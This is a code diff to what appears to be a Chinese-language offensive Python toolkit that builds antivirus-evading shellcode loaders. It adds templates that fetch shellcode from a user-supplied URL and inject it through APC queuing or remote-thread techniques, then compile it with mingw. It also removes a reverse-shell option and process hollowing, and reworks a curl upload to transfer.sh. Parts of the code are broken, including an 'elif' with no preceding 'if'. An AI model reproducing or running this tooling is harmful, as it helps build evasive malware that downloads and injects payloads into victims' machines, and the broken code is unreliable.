@@ -2,6 +2,7 @@ import base64
 import os
 import random
 import string
+import subprocess
 from time import sleep
 
 from tkinter import *
@@ -29,16 +30,14 @@ class DAZZLINGCOLORS:
 Cpp_injection_mode_options = DAZZLINGCOLORS.OKPINK + """
                                                       
 Injection Mode:
-+----------+----+--------------------------+--------+--- +
-|1.processhollowing                                      |                
-*                                                        *
-|2.QueueUserAPC                                          |   
++----------+----+--------------------------+--------+--- +           
+|1.QueueUserAPC                                          |   
 *                                                        *   
-|3.RemoteThreadContext                                   |    
+|2.RemoteThreadContext                                   |    
 *                                                        *   
-|4.RemoteThreadSuspended                                 |
+|3.RemoteThreadSuspended                                 |
 *                                                        *
-|5.CurrentThread                                         |   
+|4.CurrentThread                                         |   
 +----------+----+--------------------------+--------+----+\n
 """
 
@@ -49,15 +48,21 @@ Option_stub = Resource.StringPainting.DynamicPainting.DynaminString()  + """
  
 \033[1;36m 1.免杀加载器(\033[1;33mLoader Bypass AntiVirus\033[0m)
 \033[1;36m 2.文件格式转换(\033[1;33mFile Format Conversion\033[0m)
-\033[1;36m 3.Dll生成(\033[1;33mDynamic link library generation\033[0m)
+\033[1;36m 3.Dll生成器(\033[1;33mDynamic link library generation\033[0m)
 \033[1;36m 4.文件托管(\033[1;33m File Bundle\033[0m)
-\033[1;36m 5.反弹Shell(\033[1;33mReverShell Bypass AntiVirus\033[0m)
 """
 
 
 with open('Stub/powershell_to_vbs.ps1', 'r',encoding='utf-8') as powershell_to_vbs:
         powershell_to_vbs = powershell_to_vbs.read()  
-
+with open('Stub/CurrentThread.cpp', 'r',encoding='utf-8') as CurrentThread:
+        CurrentThread = CurrentThread.read()  
+with open('Stub/APC_Injection.cpp', 'r',encoding='utf-8') as APC_Injection:
+        APC_Injection = APC_Injection.read()  
+with open('Stub/RemoteThreadContext.cpp', 'r',encoding='utf-8') as RemoteThreadContext:
+        RemoteThreadContext = RemoteThreadContext.read()
+with open('Stub/RemoteThreadSuspended.cpp', 'r',encoding='utf-8') as RemoteThreadSuspended:
+        RemoteThreadSuspended = RemoteThreadSuspended.read()          
 
 INOTGREEN = Fore.GREEN+ "<GREEN>:"
 
@@ -122,7 +127,7 @@ def GetDesktopPath():
     return os.path.join(os.path.expanduser("~"), 'Desktop')
 
 
-def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
+def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspended,CurrentThread,verbose):
     # print(stub)
     print(Option_stub)
     while True:
@@ -134,7 +139,7 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                       "\nPlease select shellcode loader:\n"
                       "+----------+----+--------------------------+--------+ \n"
                       "|                                                   | \n"
-                      "|1.C/C++ Staglesss ShellCode(bin)(单阶段加载)        | \n"
+                      "|1.C/C++ Syscall Multi-stage loading                | \n"
                       "|                                                   | \n"
                       "+----------+----+--------------------------+--------+ \n")
                                 
@@ -148,59 +153,46 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                     
                     print("\n")
                     #file = input(DAZZLINGCOLORS.OKGREEN + "请输入raw格式的文件:\n" +INOTGREEN)
-                    filepath = ReadFilePath('bin')
-                    print(filepath)
-                    print("\n")
-                    print(DAZZLINGCOLORS.OKPINK + 
-                        "+----------+----+--------------------------+--------+\n"
-                        "|1.notepad.exe              2.explorer.exe          |\n"
-                        "|3.rundll32.exe             4.Schtasks.exe          |\n"
-                        "|5.Regsvr32.exe             6.Wmic.exe              |\n"
-                        "|7.OneDrive.exe                                     |\n"
-                        "+----------+----+--------------------------+--------+\n")
-                    inject_option = input(DAZZLINGCOLORS.OKGREEN +"\n(Select injected process)\n"+INOTGREEN)
                     
-                    
-                    if inject_option == "1":
-                        inject_option = "notepad.exe"
-                    if inject_option == "2":
-                        inject_option = "explorer.exe"
-                    if inject_option == "3":
-                        inject_option = "rundll32.exe"
-                    if inject_option == "4":
-                        inject_option = "Schtasks.exe"
-                    if inject_option == "5":
-                        inject_option = "Regsvr32.exe"
-                    if inject_option == "6":
-                        inject_option = "Wmic.exe"
-                    if inject_option == "7":
-                        inject_option = "OneDrive.exe"
+                 
+                    URL = input(DAZZLINGCOLORS.OKGREEN +"\n(enter the URL of bin)\n"+INOTGREEN)
                     
                     outfile = "%USERPROFILE%\Desktop\\Green.exe"
-                    
-                    
                     try:
                         if os.path.exists(outfile):
                             os.system("""del "{0}"\n""".format(outfile))
                         
-                        if Inject_Module in ["1", "processhollow"]:
-                                os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -m processhollow -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
-                        elif Inject_Module in ["2", "QueueUserAPC", "queueUserapc"]:
-                            os.system(
-                                """python Stub\\Cpp_loader.py "{0}"  -m queueUserapc -nr -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
-                        elif Inject_Module in ["3", "RemoteThreadContext", "remotethreadcontext"]:
-                            os.system(
-                                """python Stub\\Cpp_loader.py "{0}"  -m remotethreadcontext -p {1} -o "{2}"\n""".format(filepath, inject_option,outfile,str(outfile)))
-                        elif Inject_Module in ["4", "RemoteThreadSuspended", "remoteThreadsuspended"]:
-                            os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -p {1} -m remoteThreadsuspended -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
-                        elif Inject_Module in ["5", "CurrentThread", "currentthread"]:
-                            os.system(
-                                """python Stub\\Cpp_loader.py "{0}" -m currentthread  -nr -p {1} -o "{2}"\n""".format(filepath, inject_option,str(outfile)))
+                       
+                        elif Inject_Module in ["1", "QueueUserAPC", "queueUserapc"]:
+                            APC_Injection = APC_Injection.replace("URLREPLACE",URL)
+                            stub = open("Stub\\stub.cpp", "w")
+                            stub.write(APC_Injection)
+                            stub.close()
+                            os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+                        elif Inject_Module in ["2", "RemoteThreadContext", "remotethreadcontext"]:
+                           RemoteThreadContext = RemoteThreadContext.replace("URLREPLACE",URL)
+                           stub = open("Stub\\stub.cpp", "w")
+                           stub.write(RemoteThreadContext)
+                           stub.close()
+                        elif Inject_Module in ["3", "RemoteThreadSuspended", "remoteThreadsuspended"]:
+                           RemoteThreadSuspended = RemoteThreadSuspended.replace("URLREPLACE",URL)
+                           stub = open("Stub\\stub.cpp", "w")
+                           stub.write(RemoteThreadSuspended)
+                           stub.close()
+                        elif Inject_Module in ["4", "CurrentThread", "currentthread"]:
+                            CurrentThread_stub = CurrentThread.replace("URLREPLACE",URL)
+                            stub = open("Stub\\stub.cpp", "w")
+                            stub.write(CurrentThread_stub)
+                            stub.close()
+                            
+                        os.system("x86_64-w64-mingw32-g++ Stub\\stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows")
+                        if os.path.exists("a.exe"):
+                            print(randomcolor()+"[+] Generated successfully!")
+                        else:{
+                            print(randomcolor()+"[!] Generated failed")
+                        }
+                        os.system("del Stub\\stub.cpp")
                         
-                        print("\n")
-                        #os.system("del stub.cpp")
                         break
                     except:
                         continue
@@ -301,92 +293,9 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                     except:
                         continue
                  
-                if  formatopions == "4": #4.ps1_to_exe  
-                    print(Resource.StringPainting.DynamicPainting.DynaminString())
-                        
-                        
-                    print(randomcolor()+
-                        "+----------+----+--------------------------+----------+\n"
-                        "|                                                     |\n"
-                        "| [1].NET2.0 && .NET3.5(Run in WinServer2008/Win7 PC) |\n"
-                        "|                                                     |\n"
-                        "|                                                     |\n"
-                        "| [2].NET4.5(Run in WinServer2012 R2/Windows 10 PC)   |\n"
-                        "|                                                     |\n"
-                        "+----------+----+--------------------------+----------+\n")
-                    
-                    
-                    Dotnet_choice = input(DAZZLINGCOLORS.OKGREEN +"select .NET Version\n\n"+INOTGREEN)
-                    filepath = ReadFilePath('ps1')
-                    with open(filepath, 'r',encoding='utf-8') as filestub:
-                        filestub = filestub.read()
-                    
-                    # print(PowerShell_stub)
-                    PowerShell_stubEncryption = base64.b64encode(filestub.encode('utf-8')).decode("utf-8")
-                    Csharp_stub = Csharp_stub.replace("csharp_return", PowerShell_stubEncryption)
-                    print(DAZZLINGCOLORS.OKGREEN + "[+] Enable Verbose Messages")
-                    writefile = open("csharp_stub.cs", "w")
-                    writefile.write(Csharp_stub)
-                    writefile.close()
-                    sleep(1)
-                    print(DAZZLINGCOLORS.OKGREEN + "[+] Save new stub to csharp_stub.cs")
-                    sleep(1)
-                    print(DAZZLINGCOLORS.OKGREEN +"[+] Embedding demo.ico C# assembly, Don't change its location")
-                    sleep(1)
-                        
-                    outfile  = GetDesktopPath() + "\\csharp_stub.exe"
-                    try:
-                        if os.path.exists(outfile)==True:
-                            os.system("""del "{0}"...""".format(outfile))
-                        print(DAZZLINGCOLORS.OKGREEN +"""[+] deleted the old "{0}"\n""".format(outfile))
-                        print(DAZZLINGCOLORS.OKGREEN +"[+] Generating csharp_stub.exe")
-                        if os.path.exists(outfile):
-                            os.system("""del "{0}"\n""".format(outfile))
-                        if Dotnet_choice =="1":
-                            os.system("""C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe /reference:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /target:winexe /nologo /warn:0 /out:"{0}" csharp_stub.cs""".format(outfile))
-                        else:
-                            os.system("""C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\csc.exe /reference:C:\\WINDOWS\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /nologo /warn:0 /target:winexe /out:"{0}" csharp_stub.cs""".format(outfile))
-                            # C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc /reference:C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll /target:winexe .\Program.cs
-                        if os.path.exists(outfile) == True:
-                            print(randomcolor() +"[!] Compile Successfully:{0}\n\n".format(outfile))
-                        else:
-                            print(randomcolor() +"[!] Compilation failed\n\n")
-                        os.system("""del "{0}"\n""".format("csharp_stub.cs"))
-                        
-                        break
-                            
-                    except:
-                        continue
-                if formatopions == "5":  #5.exe_to_bin
-                    print("请选择你的文件(Select your file)")
-                    FilePath = ReadFilePath("exe")
-                    print(FilePath)
-                    if os.path.exists("payload.bin"):
-                        os.system("del payload.bin")
-                    try:
-                        os.system("""Resource\donut.exe -f "{0}" -o payload.bin""".format(FilePath))
-                        
-                        print(DAZZLINGCOLORS.OKRED + "[+]payload generated successfully--->payload.bin")
-                        break
-                    except:
-                        continue
-                    
-                if formatopions == "6": #6.base64_to_shellcode(hex) 
-                   
-                    print("请选择base64加密txt文档(Select base64 encoded document)\n" + INOTGREEN)
-                    FilePath = ReadFilePath("txt")
-                    with open(FilePath, 'r',encoding='utf-8') as files:
-                        text = files.read()
-                    #print(text)
-                    print(powershell_payload)
-                    base64_shellcode = base64_shellcode.replace("return_base64", text)
-                    writefile = open("base64_shellcode.cs", "w")
-                    writefile.write(base64_shellcode)
-                    writefile.close()
-                    os.system("C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\csc.exe /reference:C:\\WINDOWS\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /target:winexe /nologo /warn:0 base64_shellcode.cs")
-                    os.system("base64_shellcode.exe")
-                    os.system("start shellcode(hex).txt")
-                    os.system("del base64_shellcode.exe&&del base64_shellcode.cs")
+   
+            
+                
                 if formatopions == "7":  #7.ps1_to_vbs(stageless)
                     FilePath = ReadFilePath("ps1")
                     with open(FilePath, 'r',encoding='utf-8') as files:
@@ -480,40 +389,34 @@ def main(powershell_to_vbs,Cpp_injection_mode_options,verbose):
                     print("\n")
                     os.system("del stub.cpp")
         if Options == "4":
-            while True:
                 print(Resource.StringPainting.DynamicPainting.DynaminString() + DAZZLINGCOLORS.OKPINK)
                 print(Resource.StringPainting.DynamicPainting.DynaminString())
-                print("""\n[+]1.文件上传(File Upload)\n[+]2.文本内容上传(Text content upload)\n""")
-                Command_choice = input("请输入你的选项:\n"
-                                        +INOTGREEN)
-                if Command_choice == "1":
-                    my_filetypes = [('all files', '.*'), ('text files', '.txt')]
-                    answer = filedialog.askopenfilename(initialdir=os.getcwd(),title="请选择一个文件:",filetypes=my_filetypes)
+
+
+                my_filetypes = [('all files', '.*'), ('text files', '.txt')]
+                answer = filedialog.askopenfilename(initialdir=os.getcwd(), title="请选择一个文件:", filetypes=my_filetypes) 
+                if answer:
                     (file, ext) = os.path.splitext(answer)
                     (path, filename) = os.path.split(answer)
                     print(filename)
-                            
-                            
-                            
-                    result =os.popen("""curl --upload-file "{0}" https://transfer.sh/{1}""".format(answer,filename)) 
-                    context = result.read()
+
+                try:
+                    # 使用安全的方式构建和执行命令
+                    command = ["curl", "--upload-file", answer, f"https://transfer.sh/{filename}"]
+                    result = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    stdout, stderr = result.communicate()
+                    context = stdout.decode()
+
                     for line in context.splitlines():
-                        print(randomcolor() + "\n\n\n" + "文件下载链接:"+line.replace(".sh/",".sh/get/")+"\n\n\n")
-                    result.close()
+                        print(randomcolor() + "\n\n\n" + "文件下载链接:" + line.replace(".sh/", ".sh/get/") + "\n\n\n")
+                except Exception as e:
+                    print("发生错误:", e)
                     
-          
-                if Command_choice == "back"or Command_choice == "BACK":
-                    print(Option_stub)
-                    break
-                else:
-                    print(Option_stub)
-                    break
-                          
-            
+
       
         if Options not in other_commands.sheshell_commandl:
             print(Option_stub)
             other_command(Options)
                     
                         
-main(powershell_to_vbs,  Cpp_injection_mode_options,verbose=True)
+main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspended,CurrentThread,verbose=True)
